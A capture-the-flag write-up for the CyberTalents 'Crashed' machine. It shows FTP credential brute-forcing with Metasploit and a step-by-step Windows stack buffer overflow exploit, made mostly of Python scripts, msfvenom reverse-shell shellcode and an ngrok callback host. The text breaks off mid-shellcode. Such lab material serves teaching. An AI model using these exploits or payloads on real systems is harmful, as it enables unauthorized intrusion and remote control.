---
title: Cybertalents Crashed Machine Writeup
author: Muhammad Adel
date: 2021-06-29 16:40:00 +0200
categories: [Cybertalents Writeups]
tags: [cybertalents, machines, box, ctf, bufferoverflow, exploitation]
---

## **Description**

Get The highest privilege on the machine and find the flag!

**Difficulty**: Hard

Target IP: **3.122.178.169**

Target IP: **18.193.129.237**

‌**Challenge Link:** [https://cybertalents.com/challenges/machines/crashed](https://cybertalents.com/challenges/machines/crashed)

## **Enumeration**

### **Nmap**

```bash
root@kali:~/CyberTalents/Crashed# nmap -p21,135,139,445,1887,3389,5357 -A -T4 35.156.101.240
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-12 15:31 BST
Nmap scan report for ec2-35-156-101-240.eu-central-1.compute.amazonaws.com (35.156.101.240)
Host is up (0.014s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Datacenter 17763 microsoft-ds
1887/tcp open  filex-lport
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
```
‌
### **FTP**

So we have here an FTP server, I tried to join with anonymous creds but it didn't worked. Now, we have only one solutions which to brute force the password. we can use a Metasploit module called ***auxiliary/scanner/ftp/ftp_login.*** it requires a space separated wordlist we will use a wordlist form sec list but we need to edit to match our requirements, we will replace the : with a space.

```bash
root@kali:~/CyberTalents/Crashed# cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt >> ftp.txt
root@kali:~/CyberTalents/Crashed# cat ftp.txt | sed "s/:/ /g" >> ftp-space-seprated.txt
```

```bash
msf6 > use auxiliary/scanner/ftp/ftp_login
msf6 auxiliary(scanner/ftp/ftp_login) > set rhosts 35.156.101.240
rhosts => 35.156.101.240
msf6 auxiliary(scanner/ftp/ftp_login) > set USERPASS_FILE ~/CyberTalents/Crashed/ftp-space-seprated.txt
USERPASS_FILE => ~/CyberTalents/Crashed/ftp-space-seprated.txt
msf6 auxiliary(scanner/ftp/ftp_login) > run

[*] 35.156.101.240:21     - 35.156.101.240:21 - Starting FTP login sweep
[!] 35.156.101.240:21     - No active DB -- Credential data will not be saved!
[-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: anonymous:anonymous (Incorrect: )
[-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: root:rootpasswd (Incorrect: )
[-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: root:12hrs37 (Incorrect: )
[-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: ftp:b1uRR3 (Incorrect: )
[-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: admin:admin (Incorrect: )
[-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: localadmin:localadmin (Incorrect: )
[-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: admin:1234 (Incorrect: )
[-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: apc:apc (Incorrect: )
[-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: admin:nas (Incorrect: )
[-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: Root:wago (Incorrect: )
[-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: Admin:wago (Incorrect: )
[-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: User:user (Incorrect: )
[-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: Guest:guest (Incorrect: )
[+] 35.156.101.240:21     - 35.156.101.240:21 - Login Successful: ftp:ftp
```

So now we have a successful creds let's use them and see what is inside the ftp.

```bash
root@kali:~/CyberTalents/Crashed# ftp 3.122.178.169
Connected to 3.122.178.169.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (3.122.178.169:root): ftp
331 Password required for ftp
Password:
230 Logged on
Remote system type is UNIX.
ftp> ls
200 Port command successful
150 Opening data channel for directory listing of "/"
-r--r--r-- 1 ftp ftp          30036 Sep 08  2020 essfunc.dll
-r-xr-xr-x 1 ftp ftp          51635 Sep 10  2020 super_secure_server.exe
```

hmm! this machine seems to be a BOF machine. So let's download these files first. I copied these file to windows 7 machine to work on them Locally First.


## **Buffer Overflow**

### **Enumeration**

I run the super secure server in my local machine and it looks like the following:

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MdMg4OEcHH2RKjU6GEs%2F-MdMk8lBouBv4-KU1afA%2F1.png?alt=media&token=2844bd7c-a93a-4ec9-98b7-5257bbfbabb0)



It listens for a connection. So we need to know which port that its running on. we can simply open the CMD and type `netstat -ab`

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MdMg4OEcHH2RKjU6GEs%2F-MdMkU7qJJElaIRAa1iO%2F2.png?alt=media&token=6b2f2727-f93b-4ac7-bcd6-5b8da432defa)

It listens on port 13337. we let's connect to it form our Kali Machine.

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MdMg4OEcHH2RKjU6GEs%2F-MdMkfvtKHt1ouKXI2Mv%2F3.png?alt=media&token=2e6d1db4-821a-4a91-822f-7050c28da904)

hmm! We need to find anther command to know more about the application. a good solution for this simply we can run strings command to see the hidden command in the executable.


```
root@kali:~/CyberTalents/Crashed# strings super_secure_server.exe 
!This program cannot be run in DOS mode.
.text
P`.data
.rdata
0@/4
0@.bs
Starting the super secure server version %s
WSAStartup failed with error: %d
Getaddrinfo failed with error: %d
Socket failed with error: %ld
Bind failed with error: %d
Listen failed with error: %d
Waiting for client connections...
Accept failed with error: %d
Received a client connection from %s:%u
Usage: %s [port_number]
If no port number is provided, the default port of %s will be used.
Welcome to the super secure server! Enter HELP for help
Send failed with error: %d
HELP 
HELP
SECRET
Mission Completed
```
‌
Now, as you see the hidden command is `SECRET` that we need it to exploit Buffer flow vulnerability.


### **Fuzzing**

The first phase of exploiting any buffer overflow vulnerability is first to find the vulnerable command and then to know How many characters that you need to overflow the buffer and crash the application.

We have to create a simple python script for this job which will be:

```python
#!/usr/bin/python3
import sys
from time import sleep
import socket

buffer = 'A' * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.1.6", 13337))
        s.recv(1024)
        s.send(('SECRET'+ buffer))
        s.recv(1024)
        s.close()
        sleep(1)
        buffer = buffer + 'A' * 100
    except:
        print("Fuzzing Crashed at {} bytes".format(str(len(buffer))))
        sys.exit()
```

This script will send a bunch of A strings that is increasing every time until we trigger the crash of the application.

Let's attach our program to the Immunity debugger. Then, run our script.

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MdMg4OEcHH2RKjU6GEs%2F-MdMnwP9gYxDYzJkA9wU%2F4.png?alt=media&token=3286c457-4d75-4d47-82e3-6c00b7f9c05f)

The application needs 1000 bytes of strings to crash.

### **Overwrite EIP**

**EIP** is the instruction pointer. It points to (holds the address of) the first byte of the next instruction to be executed. So we need to control the next instruction that will be executed to point it to a our reverse shell and pwn the machine. to do that we need to create a unique set of strings using Metasploit.

```bash
root@kali:~/CyberTalents/Crashed# msf-pattern_create -l 1500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9
```
‌
Then we need to edit our script to send this unique string.

```python
#!/usr/bin/python3
import sys
from time import sleep
import socket

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.6", 13337))
s.recv(1024)
s.send(('SECRET'+ buffer))
s.close()
```

By running this Fuzzer we will notice in the debugger which string has overwrite the EIP.

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MdMg4OEcHH2RKjU6GEs%2F-MdMu2yjb5kAiaSXfXv6%2F5.png?alt=media&token=8610c7f1-b9d6-43c9-9937-e9e1b854ce8f)


The EIP points to `33684232` So we need to know what this number place between our unique string. Metasploit also provide a tool that we will us in this process.

```bash
root@kali:~/CyberTalents/Crashed# msf-pattern_offset -l 1500 -q 33684232
[*] Exact match at offset 998
```
‌
Now let's edit our script to ensure that the EIP will be overwritten.

```python
#!/usr/bin/python3
import sys
from time import sleep
import socket

buffer = "A" * 998 + "B" * 4 + "C" * 498

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect(("192.168.1.6", 13337))
s.recv(1024)
s.send(("SECRET"+ buffer + '\r\n'))
s.close()
```

When run this script we will find in the immunity debugger that the EIP has been overwritten by `BBBB == 424242`

### **JMP ESP**

As I said we need to overwrite the EIP to control the next instruction. we need to point the next instruction to the ESP which we also control it. so need to find the hex number for a JMP ESP instruction. we can utilize Mona to do our Job.

[https://github.com/corelan/mona](https://github.com/corelan/mona)

Then, we enter these commands in the immunity debugger:
```
!mona modules
!mona find -s '\xff\xe4'  -m essfunc.dll
```
![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MdMg4OEcHH2RKjU6GEs%2F-MdN-610GjiFEqMPJkCf%2F6.png?alt=media&token=0eb5d6ba-873c-4113-b05b-efd537b87fac)

we can choose between these pointers as long as all protection are disabled.


### **Check Bad-Chars**

Now, before we create our exploit we need to find the bad character that will prevent our exploit form running. we can use this script to check the bad-chars.

```python
#!/usr/bin/python3
import sys
from time import sleep
import socket

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "A" * 998 + "\xA0\x12\x50\x62" + badchars

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect(("192.168.1.6", 13337))
s.recv(1024)
s.send(("SECRET"+ buffer + '\r\n'))
s.close()
```

After running the script we will see the following:

![](https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MdMg4OEcHH2RKjU6GEs%2F-MdN1Di88RruG_nJYOdL%2F8.png?alt=media&token=2af1b4d3-2ba7-4846-a1fc-dca0e25399d8)

By doing some eye-process checking we can see that there is no bad chars except `"\x00"`


### **Generate Payload**

The last step that we will do to help us create our final exploit is to generate the shell code by using Msfvenom that will allow us to control the machine and obtain a reverse shell.

```bash
root@kali:~/CyberTalents/Crashed# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.4 LPORT=4444 EXITFUNC=thread -f py -a x86 –platform windows -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1712 bytes
buf =  b""
buf += b"\xda\xc6\xd9\x74\x24\xf4\x5e\x29\xc9\xbf\x48\x33\x25"
buf += b"\x1b\xb1\x52\x31\x7e\x17\x03\x7e\x17\x83\xa6\xcf\xc7"
buf += b"\xee\xca\xd8\x8a\x11\x32\x19\xeb\x98\xd7\x28\x2b\xfe"
buf += b"\x9c\x1b\x9b\x74\xf0\x97\x50\xd8\xe0\x2c\x14\xf5\x07"
buf += b"\x84\x93\x23\x26\x15\x8f\x10\x29\x95\xd2\x44\x89\xa4"
buf += b"\x1c\x99\xc8\xe1\x41\x50\x98\xba\x0e\xc7\x0c\xce\x5b"
buf += b"\xd4\xa7\x9c\x4a\x5c\x54\x54\x6c\x4d\xcb\xee\x37\x4d"
buf += b"\xea\x23\x4c\xc4\xf4\x20\x69\x9e\x8f\x93\x05\x21\x59"
buf += b"\xea\xe6\x8e\xa4\xc2\x14\xce\xe1\xe5\xc6\xa5\x1b\x16"
buf += b"\x7a\xbe\xd8\x64\xa0\x4b\xfa\xcf\x23\xeb\x26\xf1\xe0"
buf += b"\x6a\xad\xfd\x4d\xf8\xe9\xe1\x50\x2d\x82\x1e\xd8\xd0"
buf += b"\x44\x97\x9a\xf6\x40\xf3\x79\x96\xd1\x59\x2f\xa7\x01"
buf += b"\x02\x90\x0d\x4a\xaf\xc5\x3f\x11\xb8\x2a\x72\xa9\x38"
buf += b"\x25\x05\xda\x0a\xea\xbd\x74\x27\x63\x18\x83\x48\x5e"
buf += b"\xdc\x1b\xb7\x61\x1d\x32\x7c\x35\x4d\x2c\x55\x36\x06"
buf += b"\xac\x5a\xe3\x89\xfc\xf4\x5c\x6a\xac\xb4\x0c\x02\xa6"
buf += b"\x3a\x72\x32\xc9\x90\x1b\xd9\x30\x73\xe4\xb6\x3b\x87"
buf += b"\x8c\xc4\x3b\x96\x10\x40\xdd\xf2\xb8\x04\x76\x6b\x20"
buf += b"\x0d\x0c\x0a\xad\x9b\x69\x0c\x25\x28\x8e\xc3\xce\x45"
buf += b"\x9c\xb4\x3e\x10\xfe\x13\x40\x8e\x96\xf8\xd3\x55\x66"
buf += b"\x76\xc8\xc1\x31\xdf\x3e\x18\xd7\xcd\x19\xb2\xc5\x0f"
buf += b"\xff\xfd\x4d\xd4\x3c\x03\x4c\x99\x79\x27\x5e\x67\x81"
buf += b"\x63\x0a\x37\xd4\x3d\xe4\xf1\x8e\x8f\x5e\xa8\x7d\x46"
buf += b"\x36\x2d\x4e\x59\x40\x32\x9b\x2f\xac\x83\x72\x76\xd3"
buf += b"\x2c\x13\x7e\xac\x50\x83\x81\x67\xd1\xa3\x63\xad\x2c"
buf += b"\x4c\x3a\x24\x8d\x11\xbd\x93\xd2\x2f\x3e\x11\xab\xcb"
buf += b"\x5e\x50\xae\x90\xd8\x89\xc2\x89\x8c\xad\x71\xa9\x84"
```

Now, let's add our shell code to our final exploit.
```python
#!/usr/bin/python3
import sys
from time import sleep
import socket

buf =  b""
buf += b"\xb8\xa9\x88\x23\xc6\xdb\xd5\xd9\x74\x24\xf4\x5b\x29"
buf += b"\xc9\xb1\x52\x83\xc3\x04\x31\x43\x0e\x03\xea\x86\xc1"
buf += b"\x33\x10\x7e\x87\xbc\xe8\x7f\xe8\x35\x0d\x4e\x28\x21"
buf += b"\x46\xe1\x98\x21\x0a\x0e\x52\x67\xbe\x85\x16\xa0\xb1"
buf += b"\x2e\x9c\x96\xfc\xaf\x8d\xeb\x9f\x33\xcc\x3f\x7f\x0d"
buf += b"\x1f\x32\x7e\x4a\x42\xbf\xd2\x03\x08\x12\xc2\x20\x44"
buf += b"\xaf\x69\x7a\x48\xb7\x8e\xcb\x6b\x96\x01\x47\x32\x38"
buf += b"\xa0\x84\x4e\x71\xba\xc9\x6b\xcb\x31\x39\x07\xca\x93"
buf += b"\x73\xe8\x61\xda\xbb\x1b\x7b\x1b\x7b\xc4\x0e\x55\x7f"
buf += b"\x79\x09\xa2\xfd\xa5\x9c\x30\xa5\x2e\x06\x9c\x57\xe2"
buf += b"\xd1\x57\x5b\x4f\x95\x3f\x78\x4e\x7a\x34\x84\xdb\x7d"
buf += b"\x9a\x0c\x9f\x59\x3e\x54\x7b\xc3\x67\x30\x2a\xfc\x77"
buf += b"\x9b\x93\x58\xfc\x36\xc7\xd0\x5f\x5f\x24\xd9\x5f\x9f"
buf += b"\x22\x6a\x2c\xad\xed\xc0\xba\x9d\x66\xcf\x3d\xe1\x5c"
buf += b"\xb7\xd1\x1c\x5f\xc8\xf8\xda\x0b\x98\x92\xcb\x33\x73"
buf += b"\x62\xf3\xe1\xd4\x32\x5b\x5a\x95\xe2\x1b\x0a\x7d\xe8"
buf += b"\x93\x75\x9d\x13\x7e\x1e\x34\xee\xe9\xe1\x61\xf1\xed"
buf += b"\x89\x73\xf1\xfc\x15\xfd\x17\x94\xb5\xab\x80\x01\x2f"
buf += b"\xf6\x5a\xb3\xb0\x2c\x27\xf3\x3b\xc3\xd8\xba\xcb\xae"
buf += b"\xca\x2b\x3c\xe5\xb0\xfa\x43\xd3\xdc\x61\xd1\xb8\x1c"
buf += b"\xef\xca\x16\x4b\xb8\x3d\x6f\x19\x54\x67\xd9\x3f\xa5"
buf += b"\xf1\x22\xfb\x72\xc2\xad\x02\xf6\x7e\x8a\x14\xce\x7f"
buf += b"\x96\x40\x9e\x29\x40\x3e\x58\x80\x22\xe8\x32\x7f\xed"
buf += b"\x7c\xc2\xb3\x2e\xfa\xcb\x99\xd8\xe2\x7a\x74\x9d\x1d"
buf += b"\xb2\x10\x29\x66\xae\x80\xd6\xbd\x6a\xa0\x34\x17\x87"
buf += b"\x49\xe1\xf2\x2a\x14\x12\x29\x68\x21\x91\xdb\x11\xd6"
buf += b"\x89\xae\x14\x92\x0d\x43\x65\x8b\xfb\x63\xda\xac\x29"


buffer = "A" * 998 + "\xA0\x12\x50\x62" + "\x90" * 147 + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect(("192.168.1.6", 13337))
s.recv(1024)
s.send(("SECRET"+ buffer + '\r\n'))
s.close()
```

We used an encoder to generate the payload, so a space in memory is needed for the payload to unpack! that is why we have added `"\x90"`

By running our exploit we will receive a reverse shell successfully. but still we have obtained a reverse shell in our local machine we need to run this exploit to the Crashed Machine to get the Flag.

## **Root**


### **IP tunneling**

I tried to run the same exploit but on the real machine but I didn't receive a reverse shell back. the problem was that the IP address of the machine is public IP and as my network behind NAT/Firewall we need to figure out a solution to get a successful reverse shell.This is could be achieved by many scenarios

-   Using VPS with public IP and exposed to the internet to receive the reverse shell response to a specified port, This is a costly solution.

-   Configure a port forward method on my network router, this requires admin access to the Router/Modem and some advanced configuration.

-   The ultimate solution is to use the application to tunnel all the traffic to my host.

The easiest solution here is to use Ngrok which is an application to tunnel the traffic of a public IP through your machine It can be set up easily by seeing the documentation.

[https://ngrok.com/](https://ngrok.com/)

I will run Ngrok in my Linux machine to tunnel the traffic in my localhost at port 9001.

```bash
root@kali:~# /ngrok tcp 9001
ngrok by @inconshreveable                                                                                             (Ctrl+C to quit)
                                                                                                                                 
Session Status                online                                                                                                
Account                       Muhammad (Plan: Free)                                                                                   
Version                       2.3.40                                                                                                  
Region                        United States (us)                                                                                      
Web Interface                 http://127.0.0.1:4040                                                                                   
Forwarding                    tcp://8.tcp.ngrok.io:11581 -> localhost:9001                                                                                                                                                      
Connections                   ttl     opn     rt1     rt5     p50     p90                                                             
                              6       0       0.00    0.00    0.00    282.54 
```
‌
## **Remote Exploit**

Now, the final step is that we need to edit the IP of the reverse shell. we will add the IP and the port of ngrok to receive the reverse shell in it then he will tunnel to our local machine.

```bash
root@kali:~/CyberTalents/Crashed# msfvenom -p windows/shell_reverse_tcp LHOST=8.tcp.ngrok.io LPORT=11581 EXITFUNC=thread -f py -a x86 –platform windows -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1712 bytes
buf =  b""
buf += b"\xbf\xbf\xb5\x81\x09\xda\xcc\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x52\x31\x7a\x12\x83\xc2\x04\x03\xc5\xbb\x63"
buf += b"\xfc\xc5\x2c\xe1\xff\x35\xad\x86\x76\xd0\x9c\x86\xed"
buf += b"\x91\x8f\x36\x65\xf7\x23\xbc\x2b\xe3\xb0\xb0\xe3\x04"
buf += b"\x70\x7e\xd2\x2b\x81\xd3\x26\x2a\x01\x2e\x7b\x8c\x38"
buf += b"\xe1\x8e\xcd\x7d\x1c\x62\x9f\xd6\x6a\xd1\x0f\x52\x26"
buf += b"\xea\xa4\x28\xa6\x6a\x59\xf8\xc9\x5b\xcc\x72\x90\x7b"
buf += b"\xef\x57\xa8\x35\xf7\xb4\x95\x8c\x8c\x0f\x61\x0f\x44"
buf += b"\x5e\x8a\xbc\xa9\x6e\x79\xbc\xee\x49\x62\xcb\x06\xaa"
buf += b"\x1f\xcc\xdd\xd0\xfb\x59\xc5\x73\x8f\xfa\x21\x85\x5c"
buf += b"\x9c\xa2\x89\x29\xea\xec\x8d\xac\x3f\x87\xaa\x25\xbe"
buf += b"\x47\x3b\x7d\xe5\x43\x67\x25\x84\xd2\xcd\x88\xb9\x04"
buf += b"\xae\x75\x1c\x4f\x43\x61\x2d\x12\x0c\x46\x1c\xac\xcc"
